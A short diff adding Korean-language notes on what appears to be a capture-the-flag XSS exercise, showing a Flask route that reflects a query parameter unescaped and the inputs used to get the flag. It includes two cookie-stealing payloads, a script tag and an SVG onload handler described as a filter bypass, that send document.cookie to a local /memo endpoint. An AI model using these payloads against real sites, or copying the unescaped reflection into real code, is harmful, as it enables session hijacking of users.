@@ -1,0 +1,17 @@
+# 경우 1
+@app.route("/vuln")
+def vuln():
+    param = request.args.get("param", "")
+    return param # param을 요청 값으로 받는 경우
+
+=> flag를 얻기 위한 입력값 : <script>location.href = "http://127.0.0.1:8000/memo?memo=hello" + document.cookie;</script>
+
+___________________________________________________________________________________________________________________________
+
+#경우 2
+@app.route("/vuln")
+def vuln():
+    return render_template("vuln.html") # param 없이 render_template("vuln.html") 값을 리턴받는 경우
+
+=> flag를 얻기 위한 입력값 : <svg onload = "location.href = '/memo?memo=' + document.cookie">
+=> xss 방화벽 우회 문법임
